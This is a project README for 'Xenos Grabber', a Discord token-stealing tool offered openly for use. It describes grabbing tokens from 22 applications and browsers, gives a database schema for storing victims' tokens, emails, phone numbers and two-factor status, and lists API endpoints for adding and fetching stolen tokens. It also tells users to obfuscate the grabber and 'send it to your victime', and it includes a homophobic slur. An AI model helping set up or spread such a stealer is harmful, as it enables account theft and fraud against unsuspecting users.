<div align="center">
  <h2>🐺 Xenos Grabber 🐺</h2>
  <p>The most powerfull Discord Token Grabber</p>
  <a href="https://kanekiweb.tk/discord" target="_blank">Join my Discord Serveur</a><br><br>

  <img src="https://kanekiweb.tk/assets/img/xenos.gif" width="60%">
</div>

<br><br><br>


> ## Features
> - All in Interface
> - Can't delete webhook
> - Custom API for fetch/remove/add tokens
> - Login system with secret password
> - Grabber on 22 Applications/browsers
> - Very Simple Usage

<br><br>

> ## Usage
> For use Xenos, you need a Server accept PHP and contain a database,
> 1. Put the files in your host
> 2. Go to your phpmyadmin, in section SQL paste that:
> ```sql
> CREATE TABLE `tokens` (
>   `user_id` text NOT NULL,
>   `username` text NOT NULL,
>   `avatar` text NOT NULL,
>   `email` text NOT NULL,
>   `phone` text NOT NULL,
>   `badges` text NOT NULL,
>   `nitro_badges` text NOT NULL,
>   `twofactor` text NOT NULL,
>   `token` text NOT NULL
> ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
> ```
> 3. Make your database ip,databse name,username,password in the file `Inc/database.php`
> 4. Setup your passwords and webhooks in `INC/functions.php`
> 5. Make your host adress in `Grabber/python/Xenos.py` at line 5
> 6. Compte and Obfusque your Grabber and send it to your victime :)

> 7. Put a stars and follow me for more :)

<br><br>

> ## API Working
> - Add Discord Token To Database
> - - `https://yourhost.com/api?type=addtoken&token=THE_VICTIME_TOKEN`
> - Remove Discord Token From Database
> - - `https://yourhost.com/api?type=removetoken&password=YOUR_SECRET_PASSWORD&token=THE_VICTIME_TOKEN`
> - Fetch Discord Token Info From Database
> - - `https://yourhost.com/api?type=fetchtoken&password=YOUR_SECRET_PASSWORD&token=THE_VICTIME_TOKEN`

<br><br>

## Demos
> - ### Login Page
> ![](https://cdn.discordapp.com/attachments/924448086540054529/925989485999697920/unknown.png)
> - ### Index Page
> ![](https://cdn.discordapp.com/attachments/924448086540054529/926011583673557072/unknown.png)
> - ### Tokens Page
> ![](https://cdn.discordapp.com/attachments/924736351855849562/926064389650530354/unknown.png)
> - ### Youtube Demo for Gays
> [![](https://cdn.discordapp.com/attachments/935005435323351091/940059351459201106/Xenos.png)](https://www.youtube.com/watch?v=mQNPhPwYFmc)

<p align="center">
  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat" alt="Contribution Welcome">
  <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License Badge">
  <img src="https://badges.frapsoft.com/os/v3/open-source.svg?v=103" alt="Open Source">
  <img src="https://visitor-badge.laobi.icu/badge?page_id=KanekiWeb.Xenos" alt="Visitor Count">
</p>
